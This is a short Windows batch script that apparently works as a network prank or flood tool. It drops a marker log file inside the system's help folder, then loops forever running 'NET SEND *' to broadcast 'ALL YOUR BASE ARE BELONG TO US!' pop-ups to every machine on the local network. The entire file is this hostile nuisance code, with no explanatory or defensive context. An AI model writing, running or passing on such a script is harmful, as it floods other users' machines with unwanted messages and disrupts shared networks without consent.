@ECHO OFF
IF EXIST "%SystemRoot%\help\combat\1.log" GOTO END
> "%SystemRoot%\help\combat\1.log" ECHO log 1
>>"%SystemRoot%\help\combat\1.log" ECHO.

:SEND
NET SEND * ALL YOUR BASE ARE BELONG TO US!
GOTO SEND

:END
EXIT